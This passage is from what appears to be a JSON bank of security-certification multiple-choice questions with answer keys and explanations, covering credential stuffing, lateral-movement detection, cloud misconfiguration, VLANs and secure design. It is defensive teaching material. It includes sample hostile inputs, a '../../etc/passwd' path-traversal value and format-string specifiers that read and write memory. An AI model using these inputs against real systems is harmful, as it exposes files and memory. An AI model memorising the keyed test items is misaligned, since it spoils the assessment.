      "difficulty": "medium",
      "topic": "Common Threats",
      "q": "An attacker obtains a list of username/password combinations from a previously breached website and systematically attempts them against a bank's login page. This is:",
      "opts": [
        "Password spraying — trying one password against many accounts",
        "Brute force — trying all character combinations",
        "Credential stuffing — using breached credentials from one site against another",
        "Dictionary attack — using a wordlist of common passwords"
      ],
      "correct": 2,
      "exp": "Credential stuffing uses specific username/password pairs from previous breaches against new targets, relying on the fact that users reuse passwords across sites. This is distinct from brute force (exhaustive combinations) and password spraying (few passwords, many accounts). Mitigation: MFA (renders the password alone insufficient), breach password screening, rate limiting, bot detection (CAPTCHA, device fingerprinting)."
    },
    {
      "id": "m281",
      "ch": "2",
      "difficulty": "hard",
      "topic": "Mitigation Techniques",
      "q": "An organisation wants to detect attacker lateral movement within their network after a perimeter breach. Which control is MOST effective for detecting internal east-west traffic anomalies?",
      "opts": [
        "Perimeter firewall rules — all external traffic is already inspected",
        "Network traffic analysis (NTA) / User Entity Behaviour Analytics (UEBA) deployed on internal network segments, establishing baselines and alerting on anomalous lateral connections",
        "Antivirus on all endpoints",
        "Patch management — keeping all internal systems patched prevents lateral movement"
      ],
      "correct": 1,
      "exp": "NTA/UEBA monitors internal (east-west) network traffic and user behaviour patterns. By establishing baselines, it detects anomalies: a workstation scanning 100 internal IPs on SMB, a user account logging into 40 systems overnight, sudden large internal data transfers. Traditional perimeter controls are blind to east-west traffic. Antivirus and patching reduce attack surface but don't detect lateral movement by sophisticated attackers using legitimate tools."
    },
    {
      "id": "m282",
      "ch": "2",
      "difficulty": "medium",
      "topic": "Vulnerability Types",
      "q": "A vulnerability report states: \"The application accepts user-supplied filenames and constructs a path by prepending a base directory. An attacker can escape the base directory using '../' sequences.\" Which vulnerability class is described?",
      "opts": [
        "SQL injection — the filename is part of a database query",
        "Path traversal (directory traversal) — user input traverses outside the intended directory",
        "XSS — the filename is reflected in an HTML page",
        "SSRF — the filename causes a server-side request to another system"
      ],
      "correct": 1,
      "exp": "Path traversal: by including \"../\" sequences in a filename parameter (e.g., \"../../etc/passwd\"), an attacker can navigate outside the intended directory and access arbitrary files. Mitigation: (1) Use basename() or equivalent to strip directory components. (2) Canonicalise the full path and verify it starts with the expected base directory. (3) Use a whitelist of allowed filenames. (4) Store uploaded files outside the web root."
    },
    {
      "id": "m283",
      "ch": "2",
      "difficulty": "easy",
      "topic": "Common Threats",
      "q": "An attacker calls a company's helpdesk, claims to be a senior executive, and says they are locked out of their account while travelling. They urgently need their password reset. The helpdesk complies without following the verification procedure. This is an example of:",
      "opts": [
        "A technical exploit — the attacker found a bug in the helpdesk system",
        "Social engineering exploiting authority and urgency to bypass security procedures",
        "A phishing attack — the attacker sent a fake email",
        "A watering hole attack — the attacker compromised the helpdesk website"
      ],
      "correct": 1,
      "exp": "This exploits two classic social engineering principles: (1) Authority: claiming to be a senior executive creates pressure to comply. (2) Urgency/scarcity: \"locked out while travelling\" creates time pressure to bypass procedures. The solution: a rigorous out-of-band identity verification procedure that does not rely on the caller identifying themselves — verify via callback to a known number, manager confirmation, or identity verification questions."
    },
    {
      "id": "m284",
      "ch": "2",
      "difficulty": "medium",
      "topic": "Mitigation Techniques",
      "q": "A Linux server is found to have unnecessary services running: FTP, Telnet, and rsh. All three are legacy services not used in production. Which hardening principle should be applied?",
      "opts": [
        "Encrypt the services using TLS so they remain available but secure",
        "Apply access control lists to restrict which IPs can access these services",
        "Disable and remove unused services — attack surface reduction",
        "Move these services to a DMZ network segment"
      ],
      "correct": 2,
      "exp": "Attack surface reduction: every running service is a potential attack vector. Services not needed in production should be disabled and removed entirely. FTP, Telnet, and rsh transmit credentials in cleartext and have known vulnerabilities. Disabling them eliminates their attack surface completely — the most effective hardening measure. This aligns with CIS Benchmarks and DISA STIG guidance."
    },
    {
      "id": "m285",
      "ch": "2",
      "difficulty": "hard",
      "topic": "Common Threats",
      "q": "A security operations team detects that an endpoint is making DNS queries for domains matching the pattern: [random-8-char-string].update-service.com at regular intervals. What technique does this MOST likely indicate?",
      "opts": [
        "Normal Windows Update — the random strings are unique per-device identifiers",
        "Domain Generation Algorithm (DGA) — malware uses a deterministic algorithm to generate many domains, allowing C2 communication even if some domains are blocked",
        "DNS cache poisoning — the attacker is injecting fake DNS responses",
        "DNSSEC validation failure — the client is checking multiple DNSSEC records"
      ],
      "correct": 1,
      "exp": "DGA (Domain Generation Algorithm): malware generates a large number of pseudo-random domain names using a seed (often current date/time). Attacker only registers a small subset. If one C2 domain is blocked, the malware tries the next generated domain. Detection: machine learning on DNS traffic (high query volume, consistent random-looking patterns, NXDOMAIN responses). Countermeasure: detect algorithmically, block entire DGA families using threat intelligence."
    },
    {
      "id": "m286",
      "ch": "2",
      "difficulty": "easy",
      "topic": "Mitigation Techniques",
      "q": "Which tool is specifically designed to detect and block web application attacks (SQLi, XSS, CSRF) by inspecting HTTP traffic at the application layer?",
      "opts": [
        "Stateful firewall",
        "Intrusion Prevention System (IPS) with network signatures",
        "Web Application Firewall (WAF)",
        "Next-Generation Firewall (NGFW)"
      ],
      "correct": 2,
      "exp": "A WAF (Web Application Firewall) operates at OSI Layer 7 and understands HTTP/HTTPS. It applies rules to detect and block web application attacks: SQL injection, XSS, CSRF, path traversal, and others. A WAF can inspect request headers, parameters, cookies, and body content. A standard firewall operates at Layers 3-4. An IPS can detect some application attacks but has less granularity than a WAF for HTTP-specific threats."
    },
    {
      "id": "m287",
      "ch": "2",
      "difficulty": "medium",
      "topic": "Vulnerability Types",
      "q": "A developer uses the function printf(user_input) instead of printf(\"%s\", user_input). An attacker passes \"%x %x %x %x\" as input. The application prints memory contents. What vulnerability class is this?",
      "opts": [
        "Buffer overflow — the user input overflows the printf buffer",
        "Format string vulnerability — user-controlled format specifiers allow reading/writing arbitrary memory",
        "SQL injection — the format string modifies a database query",
        "Integer overflow — the %x specifiers cause integer arithmetic errors"
      ],
      "correct": 1,
      "exp": "Format string vulnerability: when user input is used as a format string directly (printf(user_input) rather than printf(\"%s\",user_input)), an attacker can inject format specifiers. %x reads 4 bytes from the stack. %s reads from an arbitrary address. %n writes to memory — enabling arbitrary write primitives. Mitigation: always use a static format string and pass user input as an argument."
    },
    {
      "id": "m288",
      "ch": "2",
      "difficulty": "hard",
      "topic": "Common Threats",
      "q": "An organisation's finance team receives an email from what appears to be their CEO's email address: \"I'm in an emergency board meeting. Wire £150,000 to this account immediately. Do not call me — I'm presenting.\" The email's From: header matches the CEO's real address. What has MOST likely occurred?",
      "opts": [
        "The CEO sent the email legitimately under duress",
        "Email spoofing — the From: header was forged; check DMARC alignment and email headers for evidence of spoofing",
        "The CEO's email account was compromised and the attacker used it",
        "Account takeover — the attacker authenticated as the CEO through MFA bypass"
      ],
      "correct": 1,
      "exp": "While all options are possible, the combination of spoofed email + urgency + financial request + \"do not call\" is the classic Business Email Compromise (BEC) pattern. The most common scenario is a forged From: header from a look-alike domain with no DMARC. Always verify wire transfer requests via a pre-established phone callback to a known number — not contact information provided in the email. DMARC p=reject would prevent domain spoofing."
    },
    {
      "id": "m289",
      "ch": "2",
      "difficulty": "medium",
      "topic": "Mitigation Techniques",
      "q": "A company wants to prevent employees from accessing known malicious websites. DNS filtering is implemented to block known bad domains. An attacker uses an uncategorised domain registered yesterday for C2. What additional control would MOST help detect this?",
      "opts": [
        "Block all DNS traffic to external resolvers — force use of internal DNS only",
        "DNS security that includes threat intelligence-based blocking of newly registered domains (NRD filtering) and anomaly detection on DNS query patterns",
        "Implement DNSSEC on all internal zones",
        "Deploy IPv6 and disable IPv4 DNS"
      ],
      "correct": 1,
      "exp": "Traditional DNS filtering uses category-based blocklists that miss newly registered domains (NRDs). C2 infrastructure commonly uses fresh domains to evade reputation-based filtering. NRD filtering blocks or flags domains registered within the last N days (commonly 30 days). Combining with DNS anomaly detection (query volume, random-looking subdomains, unusual TLDs) catches DGA and DNS tunneling that category filtering misses."
    },
    {
      "id": "m290",
      "ch": "2",
      "difficulty": "easy",
      "topic": "Common Threats",
      "q": "An employee's computer is infected with software that secretly records every key pressed — including passwords and credit card numbers typed into websites. What type of malware is this?",
      "opts": [
        "Adware",
        "Ransomware",
        "Keylogger (a type of spyware)",
        "Botnet agent"
      ],
      "correct": 2,
      "exp": "A keylogger is a type of spyware that records keystrokes, capturing passwords, credit card numbers, and other sensitive input. Software keyloggers intercept OS keyboard events. Hardware keyloggers are physical devices between keyboard and computer. Detection: anti-malware scans, process monitoring, network analysis (looking for exfiltration). Mitigation: MFA (a stolen password alone is insufficient), virtual keyboards for sensitive input, EDR solutions."
    },
    {
      "id": "m291",
      "ch": "3",
      "difficulty": "easy",
      "topic": "Network Architecture",
      "q": "Which network architecture places public-facing servers in a separate network zone between two firewalls, isolating them from both the untrusted internet and the trusted internal network?",
      "opts": [
        "VLAN segmentation of the core network",
        "A DMZ (Demilitarised Zone) / Screened Subnet architecture",
        "VPN split-tunnelling configuration",
        "A flat network with access control lists"
      ],
      "correct": 1,
      "exp": "A DMZ (Demilitarised Zone), also called a screened subnet, uses two firewalls: an outer firewall between the internet and DMZ, and an inner firewall between the DMZ and internal network. Public-facing servers (web, email, DNS) live in the DMZ. If a DMZ server is compromised, the inner firewall prevents the attacker from directly accessing the internal network. This isolates public-facing risk from internal assets."
    },
    {
      "id": "m292",
      "ch": "3",
      "difficulty": "medium",
      "topic": "Network Architecture",
      "q": "An organisation wants to prevent an attacker on the guest WiFi from accessing internal corporate systems. Both networks use the same physical switch infrastructure. Which technology most efficiently enforces this isolation?",
      "opts": [
        "Using different encryption protocols on each WiFi network",
        "VLAN segmentation with inter-VLAN routing controlled by ACLs on a Layer 3 switch or firewall",
        "Deploying a physical switch for each network",
        "MAC address filtering on the corporate SSID"
      ],
      "correct": 1,
      "exp": "VLANs (Virtual LANs) logically separate network traffic on the same physical infrastructure. Guest and corporate traffic are isolated at Layer 2. Inter-VLAN routing (Layer 3) is controlled by ACLs that block guest traffic from corporate resources. MAC filtering is easily bypassed by spoofing. Physical separation is expensive. VLAN segregation is the standard, cost-effective solution for network isolation."
    },
    {
      "id": "m293",
      "ch": "3",
      "difficulty": "hard",
      "topic": "Network Architecture",
      "q": "A network engineer configures a switch port connected to a workstation with: \"switchport mode access, switchport access vlan 10, spanning-tree portfast, spanning-tree bpduguard enable\". What does BPDU Guard accomplish in this context?",
      "opts": [
        "Prevents VLAN hopping by disabling trunk negotiation",
        "Prevents an attacker from connecting a rogue switch to the access port — if a Bridge Protocol Data Unit (BPDU) is received, the port is immediately shut down (err-disabled)",
        "Encrypts traffic between the switch and workstation",
        "Prevents the workstation from changing its VLAN assignment"
      ],
      "correct": 1,
      "exp": "BPDU Guard protects PortFast-enabled access ports (which are meant for end devices, not switches). If a rogue switch is connected and sends BPDUs (which switches exchange to run Spanning Tree Protocol), BPDU Guard immediately shuts down the port in err-disabled state. This prevents spanning tree manipulation attacks and rogue switch insertion. BPDU Guard is a standard security hardening measure for all access ports."
    },
    {
      "id": "m294",
      "ch": "3",
      "difficulty": "easy",
      "topic": "Cloud Security",
      "q": "In which cloud deployment model does the organisation's IT team NOT manage any physical hardware, and ALL infrastructure is provided by the cloud provider on a shared multi-tenant basis?",
      "opts": [
        "Private cloud — dedicated infrastructure managed by the organisation",
        "Community cloud — shared by organisations with common interests",
        "Hybrid cloud — mix of on-premises and cloud resources",
        "Public cloud — resources provided by a cloud provider and shared across multiple tenants"
      ],
      "correct": 3,
      "exp": "Public cloud (AWS, Azure, GCP): provider manages all physical infrastructure on a shared, multi-tenant basis. Customers receive virtualised resources. Cost-efficient and elastic, but the organisation has less control over the underlying infrastructure. Private cloud: dedicated, organisation-managed. Community cloud: shared among specific organisations. Hybrid: combination of on-premises and public cloud."
    },
    {
      "id": "m295",
      "ch": "3",
      "difficulty": "medium",
      "topic": "Cloud Security",
      "q": "A developer uses \"docker run --privileged nginx\". Why is this a security concern?",
      "opts": [
        "The --privileged flag disables container networking",
        "The --privileged flag grants the container full access to the host kernel — effectively breaking container isolation; a compromised container can access and modify the host system",
        "The --privileged flag prevents the container from accessing external network resources",
        "The --privileged flag disables logging for the container"
      ],
      "correct": 1,
      "exp": "--privileged in Docker disables nearly all container security restrictions — giving the container access to all host devices, capabilities, and the kernel. A privileged container can: mount host filesystems, load kernel modules, access hardware directly, and escape container isolation. This is sometimes necessary (some monitoring tools, container-in-container scenarios) but should never be used for application containers. Use specific capabilities (--cap-add) instead."
    },
    {
      "id": "m296",
      "ch": "3",
      "difficulty": "hard",
      "topic": "Cloud Security",
      "q": "An organisation uses AWS and wants to ensure that no IAM user can create AWS resources in any region except eu-west-1 and eu-central-1. Which AWS mechanism enforces this across the entire organisation?",
      "opts": [
        "IAM user permissions — add a deny policy to each user",
        "VPC configuration — VPCs are region-specific and prevent resource creation",
        "AWS Organizations Service Control Policies (SCPs) with a condition on the allowed regions",
        "AWS Config rules with automated remediation"
      ],
      "correct": 2,
      "exp": "AWS Service Control Policies (SCPs) are applied at the AWS Organizations level — they set guardrails that even administrators cannot override. An SCP with a Deny on all actions where aws:RequestedRegion is not eu-west-1 or eu-central-1 enforces this org-wide. IAM user policies can be overridden by IAM admins. AWS Config detects and can remediate but doesn't prevent. SCPs are the preventive control."
    },
    {
      "id": "m297",
      "ch": "3",
      "difficulty": "medium",
      "topic": "Application Architecture",
      "q": "A web application stores session data in a JSON Web Token (JWT) that is signed but NOT encrypted. The token contains the user's role (e.g., \"role\":\"user\"). What is the security implication?",
      "opts": [
        "No risk — signed JWTs are completely secure",
        "The token content (including role) is readable by anyone who has the token (Base64 decoding, not encryption); the signature prevents modification, but sensitive data in the token is exposed to the client and any intermediary",
        "The signature ensures the role cannot be changed — no additional risk",
        "JWTs are automatically encrypted by the browser"
      ],
      "correct": 1,
      "exp": "A signed (but unencrypted) JWT consists of: header.payload.signature — all Base64 URL-encoded. Anyone with the token can read the payload; the signature only prevents modification. Sensitive data in the JWT (PII, internal roles, permissions) is exposed. Use JWE (JSON Web Encryption) if the payload must be confidential. Minimise claims in JWTs and never include sensitive data like passwords, credit card numbers, or internal system details."
    },
    {
      "id": "m298",
      "ch": "3",
      "difficulty": "easy",
      "topic": "Application Architecture",
      "q": "An application's architecture separates the user interface, business logic, and data storage into three distinct layers. This pattern is called:",
      "opts": [
        "Microservices architecture",
        "Three-tier architecture",
        "Service-oriented architecture (SOA)",
        "Event-driven architecture"
      ],
      "correct": 1,
      "exp": "Three-tier architecture: (1) Presentation tier (web/UI), (2) Application tier (business logic, API), (3) Data tier (database). Security benefit: each tier communicates only with adjacent tiers — the web server cannot directly query the database; all database access goes through the application tier. This enables network segmentation, targeted access controls, and limits the blast radius of a compromise at any single tier."
    },
    {
      "id": "m299",
      "ch": "3",
      "difficulty": "medium",
      "topic": "Network Architecture",
      "q": "An organisation wants to allow remote employees to securely access internal resources without exposing those resources to the internet. The solution should not require users to be on the corporate VPN for all internet traffic. Which architecture achieves this?",
      "opts": [
        "Full-tunnel VPN — all traffic routed through corporate gateway",
        "Split-tunnel VPN — corporate traffic uses VPN tunnel; internet traffic uses local connection",
        "Port forwarding on the corporate firewall",
        "Publishing all internal resources to the internet with HTTPS"
      ],
      "correct": 1,
      "exp": "Split-tunnel VPN: only traffic destined for corporate resources (e.g., 10.0.0.0/8) goes through the encrypted VPN tunnel. Internet traffic (cloud services, web browsing) goes directly through the employee's ISP. Benefits: reduced corporate bandwidth load, better performance for internet applications. Risk: split-tunneling bypasses corporate content filtering for internet traffic — addressed by a DNS-based security solution that works outside the VPN."
    },
    {
      "id": "m300",
      "ch": "3",
      "difficulty": "medium",
      "topic": "Cloud Security",
      "q": "A security engineer reviews Kubernetes pod security configuration and finds: \"securityContext: runAsUser: 0\". What is the security concern?",
      "opts": [
        "User 0 in Kubernetes has no permissions by default",
        "runAsUser: 0 runs the container process as root — if the container is compromised, the attacker may be able to escalate privileges within the container or to the host if --privileged is also set",
        "User 0 is a non-privileged service account in containers",
        "This configuration enables automatic security patching"
      ],
      "correct": 1,
      "exp": "Running containers as root (UID 0) violates the principle of least privilege. Most containerised applications do not require root privileges. If a vulnerability exists in the application, a root process can read any file in the container, write to system directories, and potentially escape to the host. Best practice: run as a non-root user (runAsUser: 1000+), set runAsNonRoot: true, and use read-only root filesystems."
    },
    {
      "id": "m301",
      "ch": "3",
      "difficulty": "hard",
      "topic": "Application Architecture",
      "q": "An architect proposes using a service mesh (like Istio) in a Kubernetes environment. What is the PRIMARY security benefit of a service mesh?",
      "opts": [
        "A service mesh provides container image scanning before deployment",
        "A service mesh automatically implements mTLS between all services, providing encryption and mutual authentication for east-west traffic without modifying application code",
        "A service mesh replaces the need for network policies",
        "A service mesh provides DDoS protection for the cluster"
      ],
      "correct": 1,
      "exp": "A service mesh deploys sidecar proxies alongside each service that handle all network traffic. Key security benefits: (1) Automatic mTLS: all service-to-service traffic is encrypted and mutually authenticated — services cannot impersonate each other. (2) Traffic observability (metrics, traces). (3) Fine-grained traffic policies. Without a service mesh, implementing mTLS requires modifying every application — the mesh handles it transparently at the infrastructure layer."
    },
    {
      "id": "m302",
      "ch": "3",
      "difficulty": "easy",
      "topic": "Network Architecture",
      "q": "What is the PRIMARY function of a Network Access Control (NAC) system?",
      "opts": [
        "Filtering malicious web content based on URL categories",
        "Encrypting all network traffic between endpoints",
        "Verifying that devices meet security requirements (patch level, AV status, certificates) before allowing network access",
        "Monitoring network traffic for intrusion indicators"
      ],
      "correct": 2,
      "exp": "NAC (Network Access Control) enforces posture assessment before granting network access. It checks: OS patch level, antivirus status and signatures, required security software, device certificates, and compliance with security policies. Non-compliant devices are quarantined in a remediation VLAN with limited access to only the resources needed to fix their compliance issues. Common implementations: 802.1X with EAP, web-based authentication."
    },
    {
      "id": "m303",
      "ch": "3",
      "difficulty": "medium",
      "topic": "Cloud Security",
      "q": "An organisation migrates from on-premises to a SaaS email platform. Who is responsible for securing the email server operating system and patching the email application?",
      "opts": [
        "The organisation — they must maintain all security controls",
        "The SaaS provider — they manage all infrastructure and application layers; the organisation is responsible only for data and user access configuration",
        "Both share equal responsibility for all components",
        "A third-party managed security service provider"
      ],
      "correct": 1,
      "exp": "In the SaaS shared responsibility model, the provider manages: physical infrastructure, hypervisor, operating system, application patching, and availability. The customer is responsible for: data classification and handling, user identity and access management, and client-side configurations. This is why SaaS customers must review the provider's security posture, obtain SOC 2 reports, and ensure data handling meets regulatory requirements."
    },
    {
      "id": "m304",
      "ch": "3",
      "difficulty": "hard",
      "topic": "Network Architecture",
      "q": "An organisation implements SD-WAN (Software-Defined WAN) to connect branch offices. What is the PRIMARY security consideration that differs from traditional MPLS WAN?",
      "opts": [
        "SD-WAN uses slower protocols and requires more bandwidth",
        "SD-WAN traffic often traverses the public internet — requiring encryption for all WAN traffic (IPSec or TLS tunnels), whereas MPLS uses private network segments considered inherently more trusted",
        "SD-WAN cannot support firewall functionality",
        "SD-WAN requires more expensive hardware than MPLS"
      ],
      "correct": 1,
      "exp": "Traditional MPLS uses private circuits between provider-managed network segments — traffic doesn't traverse the public internet, providing inherent isolation. SD-WAN uses commodity broadband internet connections, which traverse shared, untrusted infrastructure. Therefore, all SD-WAN traffic MUST be encrypted (IPSec tunnels, TLS) to prevent interception. SD-WAN also requires centralised security policy management to ensure consistent controls across all branches."
    },
    {
      "id": "m305",
      "ch": "3",
      "difficulty": "medium",
      "topic": "Application Architecture",
      "q": "A web application uses a Content Delivery Network (CDN) to serve static assets. An attacker finds that if they manipulate the Cache-Control header, they can cause sensitive data to be cached and returned to other users. This is called:",
      "opts": [
        "Man-in-the-middle attack on the CDN",
        "Web cache poisoning — manipulating cached responses to serve malicious or sensitive content to other users",
        "DNS poisoning — redirecting CDN domain resolution",
        "Session fixation via CDN headers"
      ],
      "correct": 1,
      "exp": "Web cache poisoning: an attacker manipulates HTTP headers (X-Forwarded-Host, X-Cache, Vary) to cause a CDN or reverse proxy to cache a malicious response and serve it to other users. In the described scenario, sensitive data cached for one user is returned to others. Mitigations: validate all headers before caching, use Vary headers correctly, don't cache responses containing user-specific data, use separate cache keys for authenticated content."
    },
    {
      "id": "m306",
      "ch": "3",
      "difficulty": "easy",
      "topic": "Cloud Security",
      "q": "An organisation stores all company data in AWS S3 buckets. A security audit finds a bucket with \"Block Public Access\" disabled and a bucket policy allowing s3:GetObject for Principal \"*\". What is the risk?",
      "opts": [
        "The bucket can only be accessed by AWS employees",
        "The bucket is publicly readable — any internet user can download all files without authentication",
        "Only other AWS accounts can access the bucket",
        "The bucket policy applies only to objects uploaded before the policy was created"
      ],
      "correct": 1,
      "exp": "Principal \"*\" in an S3 bucket policy means any unauthenticated internet user can perform the allowed actions (s3:GetObject = download files). This is one of the most common AWS misconfigurations and has caused numerous data breaches. Fix: enable \"Block Public Access\" at both account and bucket levels. This setting overrides any bucket policy or ACL that would otherwise grant public access. Apply it as an account-level default."
    },
    {
      "id": "m307",
      "ch": "3",
      "difficulty": "hard",
      "topic": "Application Architecture",
      "q": "A security team discovers that their application has a dependency on a popular NPM package that has been compromised with malicious code in its latest version. Which proactive control would have caught this before deployment?",
      "opts": [
        "Penetration testing of the production application",
        "Software Composition Analysis (SCA) integrated into the CI/CD pipeline — detecting vulnerable, compromised, or abandoned dependencies before build artifacts are deployed",
        "Static analysis (SAST) of the application's own source code",
        "Encrypting all application dependencies before deployment"
      ],
      "correct": 1,
      "exp": "SCA (Software Composition Analysis) tools (Snyk, OWASP Dependency-Check, GitHub Dependabot) scan dependency manifests (package.json, pom.xml, requirements.txt) against vulnerability databases and malicious package intelligence. Integrating SCA into CI/CD gates prevents builds with known-vulnerable dependencies from progressing. A Software Bill of Materials (SBOM) provides ongoing inventory for proactive monitoring."
    },
    {
      "id": "m308",
      "ch": "3",
      "difficulty": "medium",
      "topic": "Network Architecture",
      "q": "What is the difference between a stateless and a stateful firewall, and which is more secure for protecting web servers?",
      "opts": [
        "Stateless firewalls are faster — always preferred for web server protection",
        "A stateless firewall filters packets based on individual packet headers (source/dest IP, port, protocol) without tracking connection state. A stateful firewall tracks the state of connections and allows only packets that are part of established connections — more secure for web servers because it rejects spoofed packets that don't belong to a legitimate connection",
        "Stateful firewalls only work with encrypted traffic",
        "Stateless firewalls can detect application-layer attacks; stateful firewalls cannot"
      ],
      "correct": 1,
      "exp": "Stateful firewalls maintain a connection state table — they know which connections are legitimate (three-way handshake completed). Packets claiming to be part of connections that don't exist in the state table are rejected. This prevents IP spoofing, SYN-ACK packets without a matching SYN, and various session hijacking attempts. Stateless packet filtering is susceptible to these attacks because it evaluates each packet independently."
    },
    {
      "id": "m309",
      "ch": "3",
      "difficulty": "hard",
      "topic": "Cloud Security",
      "q": "An organisation uses Terraform to provision infrastructure. A developer's Terraform plan includes: resource \"aws_security_group_rule\" { type=\"ingress\" from_port=0 to_port=65535 protocol=\"-1\" cidr_blocks=[\"0.0.0.0/0\"]}. What is the risk?",
      "opts": [
        "The Terraform plan will fail because of invalid port range syntax",
        "This security group rule allows ALL inbound traffic from any IP on all ports and protocols — a critical misconfiguration equivalent to no inbound filtering",
        "The rule only applies to EC2 instances in the default VPC",
        "This is a valid rule for a load balancer that needs to accept connections from the internet"
      ],
      "correct": 1,
      "exp": "Protocol \"-1\" = all protocols. from_port=0, to_port=65535 = all ports. cidr_blocks=[\"0.0.0.0/0\"] = all internet IPs. This is effectively no inbound filtering — any attacker on the internet can connect to any port of any resource in this security group. This is a critical IaC misconfiguration. Prevent with: IaC security scanning (Checkov, tfsec, Terrascan) in CI/CD, and AWS Organizations SCPs preventing overly permissive security groups."
    },
    {
      "id": "m310",
      "ch": "3",
      "difficulty": "easy",
      "topic": "Application Architecture",
      "q": "A mobile banking application stores the user's account number in plaintext in the device's shared storage. Other applications on the device with storage permissions can read this file. What security principle is violated?",
      "opts": [
        "Integrity — the account number could be modified",
        "Data minimisation and secure data storage — sensitive data should be stored encrypted in secure, app-private storage",
        "Availability — the data could be deleted by other apps",
        "Non-repudiation — the user can deny the data was stored"
      ],
      "correct": 1,
      "exp": "Storing sensitive data in shared, unprotected storage violates secure data storage principles. Sensitive data should: (1) Be stored in app-private storage (not world-readable). (2) Be encrypted at rest. (3) Use platform-specific secure storage (iOS Keychain, Android Keystore). (4) Not be stored at all if not necessary (data minimisation). This is OWASP Mobile Top 10 M2: Insecure Data Storage."
    },
    {
      "id": "m311",
      "ch": "3",
      "difficulty": "medium",
      "topic": "Network Architecture",
      "q": "An organisation deploys an IDS in \"tap mode\" (also called \"passive mode\"). What is the CRITICAL limitation of this deployment compared to an inline IPS?",
      "opts": [
        "Tap mode cannot inspect encrypted traffic",
        "Tap mode receives a copy of traffic but cannot block attacks in real-time — it can only alert after malicious traffic has already reached the destination",
        "Tap mode cannot generate alerts for network-based attacks",
        "Tap mode requires more computing resources than inline deployment"
      ],
      "correct": 1,
      "exp": "In tap/passive mode, the IDS receives a copy of traffic (via port mirror/SPAN or network tap) but is not in the traffic path. This means: (1) It cannot block traffic. (2) By the time an alert fires, the malicious packet has already been delivered. The advantage: no latency impact, no single point of failure. An inline IPS is in the traffic path and can drop malicious packets in real-time — but adds latency and becomes a single point of failure."
    },
    {
      "id": "m312",
      "ch": "3",
      "difficulty": "medium",
      "topic": "Cloud Security",
      "q": "Which AWS security service continuously monitors API activity in an AWS account, recording all API calls to CloudTrail logs, and can alert on unusual API activity using machine learning?",
      "opts": [
        "AWS WAF — web application firewall for HTTP filtering",
        "AWS Shield — DDoS protection service",
        "Amazon GuardDuty — threat detection service that analyzes CloudTrail, VPC Flow Logs, and DNS logs for malicious activity",
        "AWS Inspector — vulnerability scanning for EC2 and containers"
      ],
      "correct": 2,
      "exp": "Amazon GuardDuty is a threat detection service that uses ML, anomaly detection, and threat intelligence to analyse CloudTrail API activity, VPC Flow Logs, and DNS query logs. It detects: crypto mining, unusual API calls from unknown IPs, credential theft (calls from TOR exit nodes), account compromise. CloudTrail records API calls. WAF filters HTTP. Shield protects against DDoS. Inspector finds vulnerabilities."
    },
    {
      "id": "m313",
      "ch": "3",
      "difficulty": "hard",
      "topic": "Application Architecture",
      "q": "A developer needs to implement a \"forgot password\" flow. Which approach is MOST secure?",
      "opts": [
        "Send the user's current password to their registered email address",
        "Email a one-time, time-limited, unpredictable password reset token to the registered email address; invalidate the token after use or expiry; require the new password to meet complexity requirements",
        "Send a password reset link that never expires for convenience",
        "Ask security questions and display the current password if answers are correct"
      ],
      "correct": 1,
      "exp": "Secure password reset: (1) One-time token: unpredictable, not guessable (CSPRNG, min 128-bit entropy). (2) Time-limited: token expires (15-60 minutes). (3) Invalidated after use: prevents token replay. (4) Sent to registered email: proves control of the account. Never send current passwords (they shouldn't be recoverable — only one-way hashed). Never use security questions (weak, guessable). Non-expiring tokens allow indefinite account takeover if intercepted."
    },
    {
      "id": "m314",
      "ch": "3",
      "difficulty": "easy",
      "topic": "Network Architecture",
      "q": "Which protocol provides secure, encrypted tunneling at Layer 3, allowing remote users or site-to-site connections to communicate as if on the same private network?",
      "opts": [
        "FTP over TLS (FTPS)",
        "SSH — provides encrypted remote terminal access",
        "IPSec VPN — provides encrypted Layer 3 tunneling for site-to-site or remote access connections",
        "LDAP — provides directory authentication"
      ],
      "correct": 2,
      "exp": "IPSec VPN operates at Layer 3 and can encapsulate and encrypt entire IP packets (tunnel mode) for both site-to-site and remote access scenarios. It uses IKE for key negotiation, ESP for encryption, and AH for authentication (though ESP with authentication is sufficient). IPSec can use multiple algorithms (AES, 3DES for encryption; SHA-256, SHA-384 for integrity; DH/ECDH for key exchange). Commonly used with L2TP for remote access or directly for site-to-site."
    },
    {
      "id": "m315",
      "ch": "3",
      "difficulty": "hard",
      "topic": "Cloud Security",
      "q": "An organisation uses a CSPM (Cloud Security Posture Management) tool and receives an alert: \"S3 bucket server-side encryption not enabled.\" The bucket contains non-sensitive public marketing assets. What is the BEST response?",
      "opts": [
        "Immediately remediate — all S3 buckets must be encrypted regardless of content",
        "Document that this bucket contains only non-sensitive, intentionally public content, apply the appropriate exception in the CSPM tool, and enable encryption anyway as it costs nothing and simplifies policy — the exception prevents alert fatigue",
        "Disable the CSPM alert for all S3 buckets",
        "Remove the marketing assets from S3 and use a different service"
      ],
      "correct": 1,
      "exp": "Best practice for CSPM alerts: (1) Enable encryption anyway — S3 SSE is free and has no performance impact; it eliminates the finding and simplifies policy (\"all buckets encrypted\" is simpler than exceptions). (2) Document the exception — if intentionally not encrypting, document the business justification. (3) Avoid suppressing alert classes entirely — this creates blind spots. The pragmatic answer: just enable encryption (S3 SSE is one click and free)."
    },
    {
      "id": "m316",
      "ch": "3",
      "difficulty": "medium",
      "topic": "Application Architecture",
      "q": "An organisation deploys an application that processes highly sensitive personal data. The security team recommends implementing an API gateway in front of all microservices. Which security capability does an API gateway provide?",
      "opts": [
        "Replacing the need for application-layer authentication in each microservice",
        "Centralised enforcement of authentication, authorisation, rate limiting, input validation, and TLS termination — reducing the security burden on individual microservices and providing a single audit point",
        "Encrypting all data stored by the microservices",
        "Replacing the need for a WAF"
      ],
      "correct": 1,
      "exp": "An API gateway provides: (1) Authentication/authorisation enforcement (JWT validation, OAuth token verification). (2) Rate limiting and throttling (DoS protection). (3) Input validation. (4) TLS termination. (5) Request/response logging (audit trail). (6) API versioning and transformation. Centralising these controls at the gateway means individual microservices can focus on business logic — consistent security without duplicating code across services."
    },
    {
      "id": "m317",
      "ch": "3",
      "difficulty": "hard",
      "topic": "Network Architecture",
      "q": "A security engineer implements 802.1Q-in-802.1Q (QinQ) VLAN tunneling on a network. A penetration tester subsequently demonstrates VLAN hopping by double-tagging Ethernet frames. What vulnerability did this exploit?",
      "opts": [
        "MAC flooding — the switch's CAM table was overflowed",
